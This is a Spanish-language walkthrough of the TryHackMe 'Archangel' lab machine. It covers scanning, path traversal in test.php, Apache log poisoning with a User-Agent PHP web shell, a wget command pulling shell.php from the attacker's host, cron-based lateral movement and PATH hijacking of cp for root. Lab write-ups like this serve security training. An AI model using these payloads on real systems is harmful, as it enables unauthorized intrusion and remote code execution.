---
title: "Archangel Writeup - Try-Hack-Me"
date: 2024-01-11
categories: [Writeups, Try-Hack-Me]
tags: [Linux, Easy]
image: 
  path: assets/img/imagenes/Archangel.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: "Archangel banner"
---
<style>
  h3 {
    color: #00FF00; /* Puedes cambiar "blue" por cualquier color que desees */
  }
</style>
### nmap

```python
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f1d2c9d6ca40e4640506fedcf1cf38c (RSA)
|   256 637327c76104256a08707a36b2f2840d (ECDSA)
|_  256 b64ed29c3785d67653e8c4e0481cae6c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Wavefire
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web 
![img](/assets/img/imagenes/Pasted image 20231115001626.png)
Al poner el dominio, ya tenemos la primera flag.

### Fuzzing

```python
/robots.txt
/test.php
```

### Path Traversal

mirando el ``/etc/passwd`` 
![img](/assets/img/imagenes/Pasted image 20231115001838.png)

para ver los logs 

```python
GET /test.php?view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log
```

### User-Agent Spoofing (BurpSuite)

Modificamos el php mediante el parámetro user-Agent:
```python
<?php system($_GET['cmd']);?>
```
![img](/assets/img/imagenes/Pasted image 20231115002021.png)

Podemos ejecutar comandos mediante el parámetro ``&cmd=``

```python
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log&cmd=id
```
![img](/assets/img/imagenes/Pasted image 20231115002056.png)

Cargamos una shell en php mediante wget. 
```python
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log&cmd=wget http://10.8.189.249:8000/shell.php
```

### Shell www-data

![img](/assets/img/imagenes/Pasted image 20231115002136.png)
### movimiento lateral
hay una tarea cron que se ejecuta cada cierto tiempo, tenemos permisos de escritura en este archivo, así que vamos a meterle una shell, para pasarnos al usuario archangel.

![img](/assets/img/imagenes/Pasted image 20231115002205.png)
![img](/assets/img/imagenes/Pasted image 20231115002239.png)

### Elevar privilegios
Tenemos un binario ``backup`` que tira de ``cp`` para hacer alguna movida de copia. 

vamos a crear un ``cp`` falso el cual agregamos al path para que nos de una bash cuando ejecutemos el binario 
![img](/assets/img/imagenes/Pasted image 20231115002308.png)

![img](/assets/img/imagenes/Pasted image 20231115002336.png)
### WE ARE ROOT